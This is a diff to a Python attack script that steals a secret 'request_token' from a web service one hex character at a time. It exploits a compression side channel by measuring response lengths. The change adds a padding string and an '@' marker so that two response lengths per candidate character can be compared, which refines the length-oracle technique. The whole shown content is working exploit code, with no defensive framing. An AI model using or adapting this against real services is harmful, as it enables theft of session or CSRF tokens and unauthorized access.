@@ -13,6 +13,8 @@ param_name = 'request_token'
 # All hexadecimal characters to try as possible token characters
 possible_chars = '0123456789abcdef'
 
+padding = '{}{}{}{}{}'
+
 # Initialize the guessed token as an empty string
 guessed_token = ''
 
@@ -54,24 +56,19 @@ def get_response_length(guess):
 
 while True:
     found_char = False
-    # Get the baseline response length without any new character
-    baseline_length = get_response_length(guessed_token)
-    if baseline_length is None:
-        print("Failed to get baseline response length. Exiting.")
-        break
-    print(f"Current guessed_token: '{guessed_token}', baseline length: {baseline_length}")
 
     for c in possible_chars:
-        # Append the character to the current guess
-        current_guess = guessed_token + c
         # Get the response length for the current guess
-        response_length = get_response_length(current_guess)
-        if response_length is None:
+        response_lengths = [
+            get_response_length(guessed_token + c + padding + '@'),
+            get_response_length(guessed_token + padding + c + '@')
+        ]
+        if None in response_lengths:
             continue  # Skip to the next character if the request failed
-        print(f"Trying '{current_guess}': response length = {response_length}")
+        print(f"Trying '{guessed_token + c}': response lengths = {response_lengths}")
 
         # If the response length decreases, we've guessed the correct character
-        if response_length < baseline_length:
+        if response_lengths[1] > response_lengths[0]:
             print(f"Found character: '{c}'")
             guessed_token += c
             found_char = True
